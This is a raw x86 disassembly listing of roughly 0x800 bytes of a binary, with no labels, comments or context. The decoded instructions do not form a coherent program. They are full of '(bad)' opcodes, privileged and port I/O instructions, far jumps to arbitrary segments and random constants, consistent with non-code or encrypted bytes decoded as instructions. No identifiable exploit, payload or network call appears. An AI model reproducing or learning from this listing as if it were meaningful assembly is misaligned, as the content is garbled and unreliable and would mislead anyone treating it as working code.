  412ef4:	sub    dh,BYTE PTR [esi-0x56]
  412ef7:	mov    ch,0x93
  412ef9:	push   0xffffff8f
  412efb:	xor    ebx,esi
  412efd:	in     eax,0x8f
  412eff:	push   sp
  412f01:	push   ebx
  412f02:	test   edi,esi
  412f04:	cli    
  412f05:	inc    ecx
  412f06:	lods   al,BYTE PTR ds:[esi]
  412f07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f08:	pop    ebp
  412f09:	std    
  412f0a:	cwde   
  412f0b:	jb     0x412ee6
  412f0d:	pop    ebp
  412f0e:	push   edx
  412f0f:	dec    esi
  412f10:	div    DWORD PTR [ebp-0x1e]
  412f13:	les    ebx,FWORD PTR ds:0xdb2c2eb2
  412f19:	jnp    0x412f6a
  412f1b:	lods   eax,DWORD PTR ds:[esi]
  412f1c:	ja     0x412f2d
  412f1e:	sub    ebp,DWORD PTR [edx+0x2a22ce0a]
  412f24:	icebp  
  412f25:	xor    DWORD PTR [ebp+0x43254439],0xffffffb7
  412f2c:	int3   
  412f2d:	jg     0x412ee5
  412f2f:	xlat   BYTE PTR ds:[ebx]
  412f30:	jmp    0x412ebe
  412f32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f33:	cmp    ecx,DWORD PTR [eax+0x2733217c]
  412f39:	xchg   edi,eax
  412f3a:	xchg   edx,eax
  412f3b:	sbb    DWORD PTR [edi-0x3a477e8c],edx
  412f41:	xchg   DWORD PTR [ebx-0x5a],eax
  412f44:	aam    0xda
  412f46:	imul   DWORD PTR [ecx-0x5efbcf32]
  412f4c:	scas   eax,DWORD PTR es:[edi]
  412f4d:	inc    esp
  412f4e:	and    BYTE PTR fs:[bp+si],bl
  412f52:	jecxz  0x412ef0
  412f54:	xchg   ecx,eax
  412f55:	mov    edx,0xff5a938e
  412f5a:	aad    0x96
  412f5c:	(bad)  
  412f5e:	pushf  
  412f5f:	pop    es
  412f60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f61:	or     esp,DWORD PTR [edi+eax*1]
  412f64:	inc    ebx
  412f65:	bound  edx,QWORD PTR [esi]
  412f67:	or     ebp,DWORD PTR [edi-0x720d8089]
  412f6d:	(bad)  
  412f6e:	pop    esp
  412f6f:	call   0xa7eb:0xf8e7daa5
  412f76:	add    eax,0x8d856501
  412f7b:	jo     0x412ffc
  412f7d:	dec    esp
  412f7e:	fst    DWORD PTR [ecx]
  412f80:	mov    dh,0x63
  412f82:	daa    
  412f83:	lahf   
  412f84:	rcl    DWORD PTR [ebx],1
  412f86:	(bad)  
  412f87:	loopne 0x412fd4
  412f89:	js     0x412fe3
  412f8b:	mov    dl,0x2c
  412f8d:	imul   edi,DWORD PTR [edx+0x3c],0xffffff81
  412f91:	loope  0x412ff7
  412f93:	ins    BYTE PTR es:[edi],dx
  412f94:	xor    ch,BYTE PTR [ebx-0x1d93182b]
  412f9a:	es je  0x412ffc
  412f9d:	push   esp
  412f9e:	std    
  412f9f:	or     BYTE PTR [eax+edi*1-0x1f],cl
  412fa3:	fst    DWORD PTR [ecx]
  412fa5:	addr16 int3 
  412fa7:	add    al,BYTE PTR [ebx]
  412fa9:	xor    BYTE PTR [esp+edi*2],0x31
  412fad:	in     al,dx
  412fae:	xlat   BYTE PTR ds:[ebx]
  412faf:	int    0x77
  412fb1:	pop    es
  412fb2:	push   eax
  412fb3:	imul   edx,DWORD PTR [edx],0xf27091e0
  412fb9:	pop    es
  412fba:	mov    ds:0x385caf0a,eax
  412fbf:	xlat   BYTE PTR ds:[ebx]
  412fc0:	mov    cl,0xce
  412fc2:	jmp    0xb1b19daf
  412fc7:	shl    DWORD PTR [eax+edi*1+0x6fc0a7c1],cl
  412fce:	sub    dh,BYTE PTR [ebp-0x52046f86]
  412fd4:	sar    BYTE PTR [esi+0x711e2bf9],0xc2
  412fdb:	lock fstp QWORD PTR [eax+ecx*1-0x6444ddbe]
  412fe3:	xchg   ecx,eax
  412fe4:	lea    ebx,[edi-0x6b]
  412fe7:	sub    cl,BYTE PTR [edi]
  412fe9:	inc    esp
  412fea:	fst    DWORD PTR [ebp-0x7ffee932]
  412ff0:	or     edx,ebp
  412ff2:	loop   0x412fb8
  412ff4:	inc    ebx
  412ff5:	pushf  
  412ff6:	add    BYTE PTR ds:[ebp-0x28],bh
  412ffa:	or     eax,DWORD PTR [bx+di]
  412ffd:	xchg   esp,eax
  412ffe:	lock add esi,DWORD PTR [ecx]
  413001:	setae  BYTE PTR [eax-0x2f7ccf7c]
  413008:	frstor [ebx]
  41300a:	(bad)  
  41300b:	push   ds
  41300c:	in     eax,0x4b
  41300e:	dec    esi
  41300f:	sub    BYTE PTR [ecx+edx*2],ch
  413012:	out    0xaf,eax
  413014:	sbb    al,0x7c
  413016:	mov    cl,0x4b
  413018:	push   esp
  413019:	adc    DWORD PTR [edx+0x19d81f74],ecx
  41301f:	jl     0x41300d
  413021:	daa    
  413022:	inc    ebp
  413023:	les    esp,FWORD PTR [esi-0x1c2dae88]
  413029:	scas   al,BYTE PTR es:[edi]
  41302a:	dec    edi
  41302b:	jl     0x41307b
  41302d:	sub    cl,BYTE PTR [edx+0x65105cca]
  413033:	dec    eax
  413034:	jge    0x413059
  413036:	call   DWORD PTR [edx-0x2a]
  413039:	cmp    edi,ecx
  41303b:	xchg   edx,eax
  41303c:	inc    esi
  41303d:	inc    eax
  41303e:	push   edx
  41303f:	int3   
  413040:	cs aaa 
  413042:	xchg   esi,eax
  413043:	aad    0xd3
  413045:	pushf  
  413046:	xchg   esi,eax
  413047:	mov    bh,0x74
  413049:	dec    edi
  41304a:	mov    ecx,0x4ccaa01a
  41304f:	pop    edi
  413050:	dec    eax
  413051:	and    DWORD PTR [esi+0x2b67bdac],esi
  413057:	enter  0xa661,0x73
  41305b:	inc    edi
  41305c:	and    DWORD PTR [eax],0x1a
  41305f:	pop    eax
  413060:	add    al,0x8b
  413062:	data16 clc 
  413064:	xchg   edx,eax
  413065:	xor    edi,esp
  413067:	add    esi,esp
  413069:	cmp    BYTE PTR [edx-0x5d],ah
  41306c:	xchg   esp,eax
  41306d:	mov    eax,ds:0x32fe6d94
  413072:	bound  ebx,QWORD PTR [eax+0x6043ead]
  413078:	xchg   DWORD PTR [eax-0x38],ebp
  41307b:	pop    ss
  41307c:	aam    0x22
  41307e:	jmp    0x4130f4
  413080:	or     BYTE PTR [ebx],dh
  413082:	nop
  413083:	faddp  st(6),st
  413085:	fdiv   st,st(3)
  413087:	xor    al,BYTE PTR [edi+0x3]
  41308a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41308b:	arpl   WORD PTR [ecx+0x71be1bc6],di
  413091:	sbb    al,0x0
  413093:	or     dh,BYTE PTR [esi-0x53d47149]
  413099:	dec    ebp
  41309a:	(bad)  
  41309b:	fistp  WORD PTR [edx]
  41309d:	mov    esi,DWORD PTR [ebx]
  41309f:	call   0x24ae8654
  4130a4:	xchg   cx,ax
  4130a6:	mov    eax,ds:0x7e6c0f6
  4130ab:	push   ebp
  4130ac:	pop    eax
  4130ad:	mov    WORD PTR [edi+0x13],gs
  4130b0:	xor    eax,DWORD PTR [eax-0x71]
  4130b3:	mov    bh,bl
  4130b5:	or     DWORD PTR [eax-0x29],0xffffffd8
  4130b9:	mov    BYTE PTR [eax-0x20],ch
  4130bc:	mov    ecx,0xfcfab23c
  4130c1:	jo     0x4130d9
  4130c3:	and    al,BYTE PTR [ebx-0x15]
  4130c6:	(bad)  
  4130c7:	fs imul edi,ebx,0xffffffbf
  4130cb:	pop    edx
  4130cc:	mov    DWORD PTR [ebp-0x133f217a],eax
  4130d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4130d3:	repz pop ds
  4130d5:	add    al,0xfe
  4130d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130d8:	and    BYTE PTR ds:[edx+0x5da4c1ee],ah
  4130df:	fstp   QWORD PTR [edx+eax*4-0x5]
  4130e3:	inc    ecx
  4130e4:	mov    ebx,0xc57ba6db
  4130e9:	dec    ebx
  4130ea:	xor    esp,DWORD PTR [ebp-0x7b]
  4130ed:	jg     0x41307c
  4130ef:	mov    al,ds:0x80980b15
  4130f4:	inc    esi
  4130f5:	or     dh,ch
  4130f7:	pop    esp
  4130f8:	mov    ds:0xfe3e50ac,al
  4130fd:	mov    esp,0xeda2327d
  413102:	push   0x42
  413104:	dec    ebp
  413105:	jmpw   0xb22c
  413109:	pop    esp
  41310a:	std    
  41310b:	jnp    0x413162
  41310d:	inc    edi
  41310e:	dec    esp
  41310f:	jbe    0x413135
  413111:	clc    
  413112:	mov    ds:0xb7c0e328,eax
  413117:	into   
  413118:	gs nop
  41311a:	std    
  41311b:	mov    ch,ah
  41311d:	mov    edx,DWORD PTR [ebp+0x26]
  413120:	pop    ds
  413121:	aad    0x38
  413123:	add    al,0x96
  413125:	and    BYTE PTR [edx-0xb94e0ff],cl
  41312b:	jp     0x4130d8
  41312d:	and    dl,dh
  41312f:	fsubr  DWORD PTR [esi+ecx*8-0x3b27e543]
  413136:	xlat   BYTE PTR ds:[ebx]
  413137:	add    DWORD PTR [edx],esp
  413139:	out    0x4d,eax
  41313b:	mov    ebx,0xd384374f
  413140:	out    0xea,eax
  413142:	xor    al,0x64
  413144:	jle    0x413128
  413146:	pop    edi
  413147:	mov    eax,ds:0x1c51b293
  41314c:	ret    
  41314d:	push   esi
  41314e:	sbb    dh,0x3b
  413151:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413152:	cmp    esi,DWORD PTR [ecx+edx*4]
  413155:	cld    
  413156:	pusha  
  413157:	jne    0x41311d
  413159:	mov    cl,0x56
  41315b:	je     0x4130e4
  41315d:	(bad)
  413160:	mov    edx,0x516bef73
  413165:	sub    BYTE PTR [eax-0x4bd49dfd],0xaf
  41316c:	retf   0x14cf
  41316f:	repz icebp 
  413171:	int3   
  413172:	jp     0x413108
  413174:	xchg   ebp,eax
  413175:	pushf  
  413176:	mov    esi,0xa5d78d
  41317b:	js     0x4131ae
  41317d:	push   0x8652967f
  413182:	and    esi,esi
  413184:	fdivr  QWORD PTR [eax-0x7b73face]
  41318a:	add    eax,0x969bf0b
  41318f:	mov    eax,0xbe790624
  413194:	sub    bl,BYTE PTR [ebp-0x65f5f95a]
  41319a:	and    bh,BYTE PTR [esi+edi*1]
  41319d:	enter  0xe412,0x55
  4131a1:	dec    ebx
  4131a2:	dec    esi
  4131a3:	push   ds
  4131a4:	mov    WORD PTR [edi+0x4a],ds
  4131a7:	dec    ebx
  4131a8:	add    eax,0xbb7d3726
  4131ad:	int3   
  4131ae:	scas   al,BYTE PTR es:[edi]
  4131af:	push   cs
  4131b0:	outs   dx,BYTE PTR ds:[esi]
  4131b1:	xchg   edx,eax
  4131b2:	in     eax,dx
  4131b3:	mov    edi,0x19ee98a0
  4131b8:	pop    ds
  4131b9:	xchg   ebx,eax
  4131ba:	ss pushf 
  4131bc:	dec    ebx
  4131bd:	mov    eax,ds:0xe2fa603d
  4131c2:	fwait
  4131c3:	sub    eax,DWORD PTR [ebx]
  4131c5:	push   es
  4131c6:	aaa    
  4131c7:	add    cl,BYTE PTR [edi-0x264c8480]
  4131cd:	mov    es,eax
  4131cf:	cmp    eax,0x5f22b3c7
  4131d4:	leave  
  4131d5:	fnstcw WORD PTR [ebx]
  4131d7:	test   al,0x8e
  4131d9:	jecxz  0x413163
  4131db:	pushf  
  4131dc:	cmp    al,0xad
  4131de:	push   esp
  4131df:	hlt    
  4131e0:	lahf   
  4131e1:	and    bl,BYTE PTR [ebx+0x260d2495]
  4131e7:	out    0x14,eax
  4131e9:	mov    ebp,0xb346807b
  4131ee:	jmp    0x3dc5:0x2b10989d
  4131f5:	add    DWORD PTR [edx+0x69595cba],esp
  4131fb:	out    dx,al
  4131fc:	mov    DWORD PTR [esi-0x66],edi
  4131ff:	ds adc al,0x84
  413202:	dec    esi
  413203:	enter  0x108e,0x57
  413207:	mov    esp,0x6280970b
  41320c:	add    ecx,DWORD PTR [ebx]
  41320e:	sub    DWORD PTR [esi],0x23
  413211:	push   es
  413212:	mov    edx,0x32e4b09e
  413217:	call   0xf602:0xbf3934f2
  41321e:	adc    DWORD PTR [eax],esp
  413220:	mov    DWORD PTR [ebp-0x4d7cc71c],edi
  413226:	jb     0x413220
  413228:	repnz inc esp
  41322a:	ror    BYTE PTR [eax],1
  41322c:	xor    BYTE PTR [ecx-0x1cf0acd6],dl
  413232:	fstp   DWORD PTR [edi]
  413234:	mov    cl,BYTE PTR [ecx+edi*4+0x6ca54d9d]
  41323b:	fild   DWORD PTR [ecx-0x23]
  41323e:	xor    ah,cl
  413240:	test   eax,0x4e159e01
  413245:	pslld  mm7,QWORD PTR [esi+0x5709009f]
  41324c:	out    dx,al
  41324d:	jo     0x4131e2
  41324f:	(bad)  
  413250:	rcl    BYTE PTR [esi-0x39],1
  413253:	mov    edx,0xe41f6163
  413258:	add    esi,DWORD PTR [ebx-0x4b]
  41325b:	ins    DWORD PTR es:[edi],dx
  41325c:	mov    ecx,0x4b58798b
  413261:	in     eax,0x9a
  413263:	or     DWORD PTR [eax-0x6cb98ef2],esi
  413269:	jge    0x4132c3
  41326b:	cmp    esp,edi
  41326d:	pop    edx
  41326e:	sbb    ah,BYTE PTR [edx]
  413270:	mov    eax,ds:0xbad3b474
  413275:	retf   
  413276:	fmul   DWORD PTR [ecx+0x11]
  413279:	mov    DWORD PTR [eax+0xa45f34],ebp
  41327f:	mov    fs,WORD PTR [ebx+0x559605ec]
  413285:	nop
  413286:	test   DWORD PTR [ebx+0x76],0x32d4d3db
  41328d:	dec    eax
  41328e:	gs push esp
  413290:	out    dx,al
  413291:	retf   
  413292:	(bad)  
  413293:	adc    BYTE PTR [ebp-0xc2b7f69],bl
  413299:	xlat   BYTE PTR ds:[ebx]
  41329a:	adc    BYTE PTR [ebx-0x59],ch
  41329d:	(bad)  
  41329e:	cmp    edi,DWORD PTR [ebp-0x702b1a4e]
  4132a4:	sub    ebx,DWORD PTR [esi-0x6ad33a7]
  4132aa:	or     ebx,DWORD PTR [ebp+0x2e684def]
  4132b0:	pusha  
  4132b1:	xor    al,0xca
  4132b3:	cli    
  4132b4:	imul   esi,DWORD PTR [edx+0x5e3b71c4],0x5d14c4a1
  4132be:	dec    BYTE PTR [esi-0x35]
  4132c1:	xor    al,0xc6
  4132c3:	push   ds
  4132c4:	pusha  
  4132c5:	fchs   
  4132c7:	add    BYTE PTR [esi+0x12],0x67
  4132cb:	push   edx
  4132cc:	xchg   ebp,esp
  4132ce:	xor    edi,DWORD PTR [edi+0x1b96cfb3]
  4132d4:	push   ds
  4132d5:	int3   
  4132d6:	dec    ebx
  4132d7:	sub    edx,DWORD PTR [edi-0x61]
  4132da:	ins    DWORD PTR es:[edi],dx
  4132db:	pop    ds
  4132dc:	dec    ebp
  4132dd:	test   BYTE PTR [esi+0x79c6dbb7],0xee
  4132e4:	push   ecx
  4132e5:	jl     0x41331a
  4132e7:	into   
  4132e8:	push   edi
  4132e9:	test   BYTE PTR [ecx+0x4b],ch
  4132ec:	mov    bh,0xf
  4132ee:	sub    al,0x9a
  4132f0:	push   ebp
  4132f1:	not    BYTE PTR [edi]
  4132f3:	daa    
  4132f4:	xchg   DWORD PTR [edx+0x38],ebp
  4132f7:	loopne 0x413357
  4132f9:	jl     0x4132e5
  4132fb:	add    esp,esi
  4132fd:	daa    
  4132fe:	adc    DWORD PTR [edx+0x19832280],edx
  413304:	lods   eax,DWORD PTR ds:[esi]
  413305:	(bad)  
  413306:	bound  eax,QWORD PTR [ebx]
  413308:	sub    eax,0xd94bbe23
  41330d:	add    al,0xdb
  41330f:	scas   al,BYTE PTR es:[edi]
  413310:	sti    
  413311:	arpl   WORD PTR [esi],bx
  413313:	or     esi,edi
  413315:	cwde   
  413316:	outs   dx,DWORD PTR gs:[esi]
  413318:	pop    ds
  413319:	or     al,0x86
  41331b:	push   ebp
  41331c:	jns    0x4132ad
  41331e:	mov    ebp,0x3a56a262
  413323:	fldenv [edx+0x22]
  413326:	sahf   
  413327:	push   esp
  413328:	and    eax,0x19f985a6
  41332d:	add    al,0xbb
  41332f:	fdivr  QWORD PTR [edx-0x7574e702]
  413335:	std    
  413336:	mov    ebx,0xbe50c2a8
  41333b:	and    cl,BYTE PTR [ebx]
  41333d:	scas   eax,DWORD PTR es:[edi]
  41333e:	sub    bl,BYTE PTR [edx-0x1eb68f8f]
  413344:	and    ecx,DWORD PTR [edx-0x3826e210]
  41334a:	xor    eax,0xc98e0cfe
  41334f:	retf   
  413350:	popa   
  413351:	dec    esi
  413352:	and    dh,al
  413354:	inc    eax
  413355:	pushf  
  413356:	pop    es
  413357:	xchg   esi,eax
  413358:	fst    st(0)
  41335a:	popa   
  41335b:	inc    esi
  41335c:	jmp    0x413367
  41335e:	inc    esp
  41335f:	jecxz  0x41337a
  413361:	pusha  
  413362:	(bad)  
  413363:	sahf   
  413364:	dec    edx
  413365:	push   ebx
  413366:	retf   0xa507
  413369:	fld    DWORD PTR [ebp+esi*2+0x67d6b8c1]
  413370:	mov    WORD PTR [eax],?
  413372:	cmp    BYTE PTR [ecx],dl
  413374:	jp     0x413326
  413376:	mov    cs,WORD PTR [ebx+0x455b03c]
  41337c:	pop    esp
  41337d:	xchg   DWORD PTR [edx+0x52368d0],ebx
  413383:	push   eax
  413384:	adc    al,BYTE PTR [eax+0x204f9f8e]
  41338a:	loopne 0x4133d1
  41338c:	repz test al,0x4d
  41338f:	int    0x73
  413391:	gs cmc 
  413393:	popa   
  413394:	add    DWORD PTR [ebx],ebx
  413396:	jp     0x4133d5
  413398:	shl    DWORD PTR [edx+0x69],cl
  41339b:	jp     0x413383
  41339d:	inc    edi
  41339e:	inc    ebp
  41339f:	sbb    bh,BYTE PTR [eax+edi*2+0x63]
  4133a3:	shl    ebp,cl
  4133a5:	sub    al,0xc2
  4133a7:	icebp  
  4133a8:	xor    ebx,DWORD PTR [edi+0x7bba8c03]
  4133ae:	lea    ecx,[ebx+edx*2+0x3f08584]
  4133b5:	push   esp
  4133b6:	data16 sbb bl,0x80
  4133ba:	adc    DWORD PTR [esi],ebp
  4133bc:	adc    al,0xff
  4133be:	das    
  4133bf:	out    dx,al
  4133c0:	leave  
  4133c1:	pop    ss
  4133c2:	pop    edi
  4133c3:	jbe    0x413362
  4133c5:	fcmovnu st,st(2)
  4133c7:	push   ecx
  4133c8:	push   edi
  4133c9:	xacquire xchg DWORD PTR [edx],edx
  4133cc:	mov    DWORD PTR ss:[eax+eiz*8],edi
  4133d0:	cmp    al,0xeb
  4133d2:	mov    cl,0x3a
  4133d4:	ficomp DWORD PTR ds:0x70321ac5
  4133dc:	inc    ecx
  4133dd:	aad    0x9c
  4133df:	test   al,0x26
  4133e1:	xchg   ebp,eax
  4133e2:	push   ebx
  4133e3:	dec    ebx
  4133e4:	lea    esp,[eax]
  4133e6:	jmp    0x3968:0xb4a4a904
  4133ed:	cmp    al,0x10
  4133ef:	jge    0x4133dc
  4133f1:	dec    ebx
  4133f2:	loope  0x413461
  4133f4:	jne    0x4133de
  4133f6:	dec    edi
  4133f7:	push   esp
  4133f8:	xchg   BYTE PTR [ecx+0x4c],cl
  4133fb:	test   DWORD PTR [ebp-0x61],edi
  4133fe:	push   esi
  4133ff:	repz or DWORD PTR [eax+esi*1-0x64],esp
  413404:	stos   DWORD PTR es:[edi],eax
  413405:	aam    0x4
  413407:	in     eax,0x2
  413409:	xchg   DWORD PTR [esi],ecx
  41340b:	jns    0x41345f
  41340d:	shl    eax,1
  41340f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413410:	data16 test BYTE PTR [eax],bl
  413413:	(bad)  
  413414:	lods   eax,DWORD PTR ds:[esi]
  413415:	sbb    ecx,DWORD PTR [ebp-0x3720016c]
  41341b:	mov    ds:0x5198bfa1,eax
  413420:	pop    edx
  413421:	mov    al,ds:0xdabb22e9
  413426:	mov    edi,0x587a9f39
  41342b:	nop
  41342c:	mov    al,ds:0x24afe8c6
  413431:	imul   edx,esi,0x5f02ce81
  413437:	xor    ebx,esp
  413439:	clc    
  41343a:	sbb    DWORD PTR [ecx-0x44],ecx
  41343d:	cmp    ecx,DWORD PTR [eax]
  41343f:	mov    dh,0xa6
  413441:	mov    al,0x8
  413443:	ret    
  413444:	pop    ebp
  413445:	(bad)  
  413446:	mov    esp,0x68573320
  41344b:	cmp    ah,ch
  41344d:	cdq    
  41344e:	adc    esp,edx
  413450:	push   edi
  413451:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413452:	outs   dx,DWORD PTR ds:[esi]
  413453:	mov    eax,ds:0xa94dd474
  413458:	sbb    eax,0xf39bfbd2
  41345d:	ror    BYTE PTR [ebx-0x70],0x74
  413461:	mov    al,0x9f
  413463:	or     BYTE PTR [edx-0x15],bl
  413466:	add    DWORD PTR [edi+0x44],eax
  413469:	repz push cs
  41346b:	adc    DWORD PTR [ecx+eiz*2],esp
  41346e:	nop
  41346f:	mov    WORD PTR [eax-0x52ac5a4b],gs
  413475:	or     BYTE PTR [ebx],ch
  413477:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413478:	mov    DWORD PTR [eax],0x7691319d
  41347e:	sub    al,BYTE PTR ds:0x91dfda0
  413484:	xor    DWORD PTR ds:0x44bfa67,ebx
  41348a:	enter  0x4cf0,0xb9
  41348e:	(bad)  
  41348f:	dec    ecx
  413490:	sub    ebx,edi
  413492:	sbb    ecx,DWORD PTR [ecx+0x55]
  413495:	ins    BYTE PTR es:[edi],dx
  413496:	mov    al,0xa
  413498:	or     BYTE PTR [edx],ah
  41349a:	or     esp,DWORD PTR [eax]
  41349c:	mov    ds:0x63c41cab,eax
  4134a1:	xchg   ecx,eax
  4134a2:	inc    esi
  4134a3:	and    BYTE PTR [edi+0x408bf8f1],0x14
  4134aa:	sbb    ecx,ebx
  4134ac:	int    0xee
  4134ae:	xchg   DWORD PTR [ebx+0x70e8a4bc],ecx
  4134b4:	das    
  4134b5:	cmc    
  4134b6:	inc    ebp
  4134b7:	ins    DWORD PTR es:[di],dx
  4134b9:	or     ebx,DWORD PTR [ebp-0x557246fa]
  4134bf:	xlat   BYTE PTR ds:[ebx]
  4134c0:	add    al,BYTE PTR [edi]
  4134c2:	jle    0x413535
  4134c4:	in     eax,0xcc
  4134c6:	inc    edx
  4134c7:	cld    
  4134c8:	repz mov ah,0x4d
  4134cb:	pop    es
  4134cc:	jmp    0x92bf1459
  4134d1:	mov    edx,DWORD PTR [ebp+0x53e0b776]
  4134d7:	inc    edi
  4134d8:	sbb    BYTE PTR [edi-0x37c06852],0xf3
  4134df:	imul   BYTE PTR [edi]
  4134e1:	std    
  4134e2:	shr    DWORD PTR [edi+0x60c06469],0x4f
  4134e9:	popa   
  4134ea:	cmp    eax,0x433c7bbb
  4134ef:	stos   BYTE PTR es:[edi],al
  4134f0:	xor    al,0xd5
  4134f2:	sbb    BYTE PTR [edi+0x6c],bl
  4134f5:	cwde   
  4134f6:	jmp    0x74220bd9
  4134fb:	(bad)  
  4134fc:	pop    ebp
  4134fd:	cwde   
  4134fe:	(bad)  
  4134ff:	xchg   BYTE PTR [ebx+edx*2+0x8],cl
  413503:	faddp  st(3),st
  413505:	dec    ebx
  413506:	sub    bl,BYTE PTR [edi+0x61]
  413509:	jge    0x41354a
  41350b:	mov    dl,0x24
  41350d:	nop
  41350e:	jmp    0x3f3076d8
  413513:	sbb    eax,0x4ff3f79
  413518:	sbb    DWORD PTR [eax+ebx*4-0x31d9794c],eax
  41351f:	gs mov bh,0x1b
  413522:	(bad)  
  413523:	and    bh,bh
  413525:	es inc edx
  413527:	jle    0x41353e
  413529:	push   edx
  41352a:	js     0x413531
  41352c:	fidiv  WORD PTR [edx]
  41352e:	(bad)  
  41352f:	fwait
  413530:	mov    cl,BYTE PTR [edi]
  413532:	fsubr  DWORD PTR ss:[ebp+edi*4-0x4b]
  413537:	dec    edi
  413538:	je     0x41352a
  41353a:	jo     0x41358d
  41353c:	sbb    eax,0xe93a7797
  413541:	adc    DWORD PTR [esi-0x57],esp
  413544:	add    DWORD PTR [ecx-0x53],0x32
  413548:	adc    eax,0x78be1373
  41354d:	(bad)  
  41354e:	xlat   BYTE PTR ds:[ebx]
  41354f:	mov    ah,0x65
  413551:	aad    0xcf
  413553:	pop    ebp
  413554:	into   
  413555:	ret    0x6215
  413558:	jmp    0x413553
  41355a:	call   0x57c5:0xa14b45ef
  413561:	pop    edx
  413562:	adc    al,0x49
  413564:	repnz rcr DWORD PTR [ebx],0xfa
  413568:	xor    eax,0x7bf971d
  41356d:	(bad)  
  41356e:	dec    ebp
  41356f:	aam    0xaa
  413571:	pop    edi
  413572:	mov    ds:0x172afd54,al
  413577:	add    eax,0xf58faa05
  41357c:	in     eax,dx
  41357d:	push   esp
  41357e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41357f:	mov    bl,0x7a
  413581:	fcomp  QWORD PTR [esi+0x351f153b]
  413587:	push   0x25
  413589:	in     eax,dx
  41358a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41358b:	dec    edx
  41358c:	imul   eax,DWORD PTR [edi-0x6ca0cdb6],0x6b
  413593:	fcomp  DWORD PTR [ecx]
  413595:	xlat   BYTE PTR ds:[ebx]
  413596:	lods   al,BYTE PTR ds:[esi]
  413597:	mov    ds:0x74bad27,eax
  41359c:	adc    al,0xac
  41359e:	jb     0x413531
  4135a0:	and    DWORD PTR [edx-0x12],0x3aaf99bb
  4135a7:	cmc    
  4135a8:	cmc    
  4135a9:	xor    ecx,DWORD PTR [ebx]
  4135ab:	repz (bad) 
  4135ad:	pop    ebx
  4135ae:	dec    edx
  4135af:	shr    DWORD PTR [esi-0x12c5e51f],cl
  4135b5:	inc    esi
  4135b6:	sub    eax,0x4a4a9358
  4135bb:	mov    ebp,0x4699f27a
  4135c0:	or     al,BYTE PTR [ebx+0x74]
  4135c3:	jo     0x41362e
  4135c5:	ins    BYTE PTR es:[edi],dx
  4135c6:	mov    ebx,ebx
  4135c8:	dec    ecx
  4135c9:	sbb    al,0xa9
  4135cb:	mov    edi,0xa0b4d285
  4135d0:	pop    es
  4135d1:	sub    cl,BYTE PTR [ebx]
  4135d3:	or     DWORD PTR cs:[eax+0x1052eadc],0x2
  4135db:	ret    0x2fac
  4135de:	pop    ss
  4135df:	mov    cl,0x19
  4135e1:	pushf  
  4135e2:	cmp    bl,ch
  4135e4:	ins    DWORD PTR es:[edi],dx
  4135e5:	or     eax,0xfb84046d
  4135ea:	add    cl,BYTE PTR [edx]
  4135ec:	sub    DWORD PTR [ebx+0x43497ae5],0x3f
  4135f3:	ret    
  4135f4:	sub    esp,ebp
  4135f6:	jp     0x4135f3
  4135f8:	cmc    
  4135f9:	mov    bh,BYTE PTR [edx-0x76]
  4135fc:	push   eax
  4135fd:	and    DWORD PTR [eax-0x5b],esi
  413600:	ror    dh,1
  413602:	xor    al,0x54
  413604:	and    eax,0xb5d1b096
  413609:	or     bh,BYTE PTR [ecx+edx*8-0x1ffd8080]
  413610:	adc    DWORD PTR [esi+eax*4-0x23196a57],esp
  413617:	sub    eax,0xa94c33ba
  41361c:	out    dx,al
  41361d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41361e:	and    al,0x36
  413620:	int    0xeb
  413622:	mov    eax,0x85138c8c
  413627:	les    esi,FWORD PTR [edx-0x19]
  41362a:	repz test BYTE PTR [edi-0x5ac6368b],0x35
  413632:	mov    WORD PTR [ebx-0x7d32604d],es
  413638:	jle    0x4135d9
  41363a:	add    DWORD PTR [ebx+edi*2+0x4d],0x475b263e
  413642:	sub    BYTE PTR [esi],cl
  413644:	in     al,0x17
  413646:	and    dl,dl
  413648:	push   ebp
  413649:	mov    ds:0x50c64b14,eax
  41364e:	pop    ss
  41364f:	cdq    
  413650:	ret    0x8f34
  413653:	daa    
  413654:	enter  0x7b03,0xfd
  413658:	lock pusha 
  41365a:	pop    eax
  41365b:	mov    eax,ebp
  41365d:	cdq    
  41365e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41365f:	pop    es
  413660:	mov    edx,0xb11fe1cc
  413665:	fimul  WORD PTR [esp+eiz*4+0x32]
  413669:	sbb    al,0xbd
  41366b:	rol    BYTE PTR [eax+0x72793ebf],cl
  413671:	ins    BYTE PTR es:[edi],dx
  413672:	cs loopne 0x413698
  413675:	push   ebp
  413676:	int3   
  413677:	repz mov ch,0x5
  41367a:	(bad)  
  41367b:	sub    dh,BYTE PTR [ebx-0x40]
  41367e:	cmp    bh,ch
  413680:	or     BYTE PTR cs:[edx-0x7d],cl
  413684:	call   0x2de80350
  413689:	add    edx,DWORD PTR [ecx]
  41368b:	into   
  41368c:	mov    ds:0xc0314b67,eax
  413691:	in     al,dx
  413692:	or     al,0x14
  413694:	and    BYTE PTR [ebx-0x713c483c],bh
  41369a:	push   ss
  41369b:	mov    bh,0xa1
  41369d:	pop    edx
  41369e:	pop    esi
  41369f:	xlat   BYTE PTR ds:[ebx]
  4136a0:	into   
  4136a1:	hlt    
  4136a2:	or     al,0x79
  4136a4:	adc    al,0x50
  4136a6:	mov    dl,0xee
  4136a8:	sub    eax,0xb8e9dfa
  4136ad:	(bad)  
  4136ae:	xlat   BYTE PTR ds:[ebx]
  4136af:	sbb    al,0x55
  4136b1:	hlt    
  4136b2:	dec    esi
  4136b3:	xchg   esp,eax
  4136b4:	hlt    
  4136b5:	push   es
  4136b6:	fnstenv [ebx]
  4136b8:	mov    ch,0xe0
  4136ba:	out    0x60,al
  4136bc:	dec    edi
  4136bd:	in     al,dx
  4136be:	inc    esi
  4136bf:	dec    ebx
  4136c0:	retf   0xc208
